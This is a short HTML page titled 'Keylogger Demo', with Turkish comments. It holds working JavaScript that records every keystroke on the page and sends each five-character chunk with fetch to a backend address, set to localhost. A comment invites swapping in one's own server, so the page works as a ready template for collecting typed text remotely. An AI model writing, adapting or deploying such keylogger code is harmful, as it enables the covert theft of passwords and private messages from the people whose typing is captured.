<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>Keylogger Demo</title>
</head>
<body>
  <h2>Keylogger Demo</h2>
  <textarea id="input" rows="10" cols="60" placeholder="Yazmaya başla..."></textarea>

  <script>
    // Proxy backend adresi (backend çalışıyorsa localhost veya sunucu adresi)
    const proxyUrl = 'http://localhost:3000/send'; // kendi backend adresine göre değiştir

    let logBuffer = '';

    document.addEventListener('keydown', (e) => {
      logBuffer += e.key;

      if (logBuffer.length >= 5) {
        sendToProxy(logBuffer);
        logBuffer = '';
      }
    });

    function sendToProxy(message) {
      fetch(proxyUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message: '🖊️ Yeni giriş: ' + message })
      }).catch(err => {
        console.error('Proxy gönderim hatası:', err);
      });
    }
  </script>
</body>
</html>
